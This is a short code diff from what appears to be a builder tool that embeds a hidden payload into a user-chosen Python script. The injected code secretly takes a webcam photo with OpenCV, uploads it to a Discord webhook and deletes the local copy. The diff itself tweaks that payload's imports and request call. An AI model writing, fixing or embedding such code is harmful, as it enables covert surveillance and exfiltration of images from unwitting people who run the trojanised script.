@@ -5,11 +5,12 @@ def main():
     webhook_url = input("Discord Webhook URLを入力してください: ")
     selected_script_path = input("組み込むPythonスクリプトのパスを入力してください: ")
 
-    photo_script = f"""
+    photo_script = """
 # -*- coding: utf-8 -*-
 import cv2
 import requests
 import os
+import json
 
 def take_photo():
     cap = cv2.VideoCapture(0)
@@ -43,7 +44,7 @@ def send_photo(webhook_url, photo_path):
             "embeds": embeds
         }}
         headers = {{'Content-Type': 'application/json'}}
-        response = requests.post(webhook_url, data=json.dumps(data), headers=headers, files=files)
+        response = requests.post(webhook_url, headers=headers, data=json.dumps(data), files=files)
     if response.status_code == 204:
         os.remove(photo_path)
 
